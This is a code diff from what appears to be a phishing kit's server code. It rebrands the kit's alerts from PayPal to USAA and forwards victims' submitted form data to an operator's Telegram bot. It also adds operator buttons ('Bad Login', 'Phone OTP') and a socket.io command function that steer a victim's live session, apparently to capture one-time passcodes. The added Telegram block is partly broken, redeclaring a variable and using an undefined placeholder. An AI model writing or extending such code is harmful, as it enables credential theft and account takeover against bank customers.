@@ -256,7 +256,7 @@ async function buildMessage(data, options = {}) {
   const { sendToTelegram = false, botToken = null, chatId = null } = options;
 
   try {
-    let message = `🤖 PAYPAL NEW SUBMISSION\n\n`;
+    let message = `🤖 USAA NEW SUBMISSION\n\n`;
     const excludeKeys = ["visitor", "userid", "security_code"];
 
     for (const [key, value] of Object.entries(data)) {
@@ -266,10 +266,33 @@ async function buildMessage(data, options = {}) {
     }
 
     if (sendToTelegram) {
-      if (!botToken || !chatId) throw new Error("Bot token or Chat ID missing");
-      const sendMessage = sendMessageFor(botToken, chatId);
-      await sendMessage(message);
-    }
+		  if (!botToken || !chatId) throw new Error("Bot token or Chat ID missing");
+		
+		  const sendMessage = sendMessageFor(botToken, chatId);
+		
+		  // Example commands and userId
+		  const userId = someUserIdVariable; // set dynamically
+		  const message = "Select a command for this user:";
+		
+		  // Define inline buttons
+		  const buttons = [
+		    [
+		      { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
+		      { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
+		    ],
+		    [
+		      { text: "Bad Login", callback_data: `cmd:bad-login:${userId}` },
+		      { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
+		    ]
+		  ];
+		
+		  // Send the message with inline buttons
+		  await sendMessage(message, {
+		    reply_markup: {
+		      inline_keyboard: buttons
+		    }
+		  });
+		}
 
     return message;
   } catch (err) {
@@ -304,6 +327,11 @@ function blockedRedirect(db) {
   };
 }
 
+function handleAdminCommand({ userId, command, otp }) {
+  // same code your dashboard uses
+  io.to(userId).emit("admin:command", { command, otp });
+}
+
 async function isAutopilotOn(db) {
   const row = await db.get("SELECT autopilot FROM admin_settings WHERE id = 1");
   return row?.autopilot === 1;
@@ -316,6 +344,7 @@ export {
   getReqClientIP,
   getNextPage,
   buildUserInfo,
+  handleAdminCommand,
   sendAPIRequest,
   getPageFlow,
   savePageFlow,
